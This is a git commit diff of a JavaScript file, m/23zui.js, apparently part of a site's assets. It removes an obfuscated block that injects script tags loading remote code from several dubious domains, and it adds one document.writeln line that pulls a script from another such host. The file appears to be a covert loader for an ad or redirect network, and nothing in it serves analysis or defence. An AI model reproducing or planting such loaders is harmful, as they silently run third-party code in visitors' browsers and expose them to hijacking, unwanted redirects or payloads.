1bf6a9a72b4b984d4247b927956013b50a7cb28d
qpgyy <61676079+qpgyy@users.noreply.github.com>
2020-08-23 21:56:07 +0800

    Add files via upload

--- m/23zui.js
+++ m/23zui.js
@@ -1,15 +1,1 @@
-var _vWSdgh = [{Qcb:function(){var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?22c762f574693fe943f353761c31af67";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-var s_a_e_numd = 'https://eeg.gmuqa.cn/t/6/5841?t=5841&er='+Math.floor(Math.random() * (1000 - 20 + 1) + 10000, 10);
-  var hm = document.createElement("script");
-  hm.src = s_a_e_numd;
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-},rgJ:"6000136",rwM:"1"},];var GnzSa = [6000136,];var msMAROf = Math.floor(Math.random()*GnzSa.length);for(var mMq=0;mMq < _vWSdgh.length;mMq++ ){if(GnzSa[msMAROf]==_vWSdgh[mMq].rgJ){_vWSdgh[mMq].Qcb();}}if(!window.top.zAvsD){window.top.zAvsD="OjCYAWlF";var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?935ed04368c87b93fa968eb7d7fa347b";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();}
-document.write ('<script type="text/javascript"  src="https://f.cctole.com/hx/jquery/15952411262dux8AF7.net.js"></script>');
-document.writeln("<script type=\'text/javascript\' src=\'https://1682.dlads.cn/alikes.php?id=3717\'></script>");
+document.writeln('<script type="text/javascript" src="https://f.hshczy.com/O/1000679O3001006O1O.js"><\/script>');
